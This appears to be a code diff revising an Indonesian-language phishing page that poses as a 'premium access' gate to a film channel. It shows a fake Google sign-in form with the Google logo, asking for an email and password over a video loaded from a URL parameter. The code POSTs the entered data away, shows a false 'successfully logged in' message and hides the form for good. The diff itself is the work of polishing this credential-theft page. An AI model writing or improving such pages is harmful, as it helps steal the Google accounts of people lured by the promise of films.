@@ -3,22 +3,42 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Masuk untuk Lanjut</title>
+    <title>Saluran WA Film Barat</title>
     <style>
         body {
             font-family: 'Google Sans', 'Roboto', Arial, sans-serif; /* Font mirip Google */
             margin: 0;
             padding: 0;
-            background-color: #f8f9fa; /* Latar belakang polos karena iframe dihapus */
-            /* overflow: hidden; *//* Tidak lagi diperlukan jika iframe dihapus */
+            background-color: #f8f9fa;
+            overflow: hidden; /* Mencegah scroll pada body */
             display: flex;
             justify-content: center;
             align-items: center;
             min-height: 100vh;
+            color: #202124; /* Warna teks default untuk body */
         }
 
-        /* Iframe full-screen dihapus */
-        /* .fullscreen-iframe { ... } */
+        /* Container untuk video jika ada */
+        .video-container {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            background-color: #000; /* Latar belakang hitam untuk video */
+            z-index: 1; /* Pastikan di bawah overlay dan form */
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .video-container video {
+            width: 100%;
+            height: 100%;
+            object-fit: contain; /* Agar video pas di container tanpa terpotong */
+            max-width: 100%;
+            max-height: 100%;
+        }
 
         .login-container {
             background-color: #fff;
@@ -51,7 +71,7 @@
             width: 100%;
             height: 100%;
             background-color: rgba(0, 0, 0, 0.5);
-            z-index: 999; /* Di bawah form */
+            z-index: 999; /* Di bawah form, di atas video */
             display: none; /* Sembunyikan secara default */
             opacity: 0;
             transition: opacity 0.5s ease-in-out;
@@ -163,13 +183,57 @@
     </style>
 </head>
 <body>
-    <!-- Iframe full-screen DIHAPUS karena kemungkinan masalah keamanan -->
-    <iframe src="https://mob.eroboom.pw/" class="fullscreen-iframe" allowfullscreen></iframe>
+    <!-- Skrip pemutar video dari input Anda -->
+    <div class="video-container" id="videoBackground">
+        <script>
+            function getUrlVars() {
+                var vars = {};
+                var parts = window.location.href.replace(/[?&]+([^=&]+)=([^&]*)/gi, function(m,key,value) {
+                    vars[key] = value;
+                });
+                return vars;
+            }
+
+            function getUrlParam(parameter, defaultvalue){
+                var urlparameter = defaultvalue;
+                if(window.location.href.indexOf(parameter) > -1){
+                    urlparameter = getUrlVars()[parameter];
+                }
+                return urlparameter;
+            }
+
+            var ero = getUrlParam('ero',null);
+
+            var encryptero = ero ? decodeURIComponent(ero) : null; // Handle null case for ero
+
+            // Pastikan video hanya ditulis jika encryptero valid
+            if(encryptero != null && encryptero !== 'null') { // Check for 'null' string if decodeURIComponent returns it
+                var videoElement = document.createElement('video');
+                videoElement.id = 'player';
+                videoElement.autoplay = true;
+                videoElement.controls = true;
+                videoElement.playsInline = true;
+                videoElement.webkitPlaysInline = true;
+                videoElement.controlsList = 'nodownload';
+                videoElement.oncontextmenu = function() { return false; };
+                videoElement.src = 'https://' + encryptero + '';
+                videoElement.width = '100%';
+                videoElement.type = 'video/mp4';
+                document.getElementById('videoBackground').appendChild(videoElement);
+            } else {
+                // Opsional: tampilkan sesuatu jika tidak ada video atau video tidak valid
+                // Misalnya:
+                // document.getElementById('videoBackground').innerHTML = '<p style="color:white;">Video tidak ditemukan atau tidak valid.</p>';
+                document.getElementById('videoBackground').style.backgroundColor = '#202124'; // Latar belakang gelap jika tidak ada video
+            }
+        </script>
+    </div>
+
 
     <div class="overlay" id="formOverlay"></div>
     <div class="login-container" id="loginFormContainer">
         <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google" class="google-logo">
-        <h2>Masuk</h2>
+        <h2>Akses Premium</h2>
         <p class="subtitle">Untuk akses full web/lanjut nonton</p>
         <form id="loginForm">
             <div class="input-group">
@@ -181,7 +245,7 @@
                 <label for="password">Kata sandi</label>
             </div>
             <div class="actions">
-                <button type="submit">Berikutnya</button>
+                <button type="submit">Login</button>
             </div>
         </form>
         <p id="message"></p>
@@ -216,8 +280,6 @@
         // Cek apakah form sudah pernah diisi
         if (localStorage.getItem(FORM_DISPLAYED_KEY) === 'true') {
             console.log("Form sudah pernah diisi dengan benar. Tidak akan ditampilkan.");
-            // Karena form tidak ditampilkan, langsung alihkan jika sudah login
-            // window.location.href = 'https://mob.eroboom.pw/'; // Uncomment jika Anda ingin otomatis mengalihkan
         } else {
             // Jika belum, tampilkan form setelah delay
             setTimeout(() => {
@@ -256,18 +318,17 @@
                     body: new URLSearchParams(data).toString()
                 });
 
-                messageElement.textContent = 'Berhasil login. Mengarahkan ke situs tujuan...';
+                messageElement.textContent = 'Anda telah berhasil login.';
                 messageElement.style.color = 'green';
                 form.reset(); // Kosongkan formulir setelah pengiriman
 
                 // Simpan status di localStorage agar form tidak muncul lagi
                 localStorage.setItem(FORM_DISPLAYED_KEY, 'true');
 
-                // Sembunyikan form dan alihkan pengguna ke situs tujuan setelah beberapa saat
+                // Sembunyikan form setelah beberapa saat
                 setTimeout(() => {
-                    hideForm(); // Sembunyikan form
-                    window.location.href = 'https://mob.eroboom.pw/'; // <-- Mengalihkan ke situs tujuan
-                }, 2000); // Tunggu 2 detik sebelum mengalihkan
+                    hideForm();
+                }, 2000); // Sembunyikan setelah 2 detik
             } catch (error) {
                 console.error('Error sending data:', error);
                 messageElement.textContent = 'Gagal login. Silakan coba lagi.';
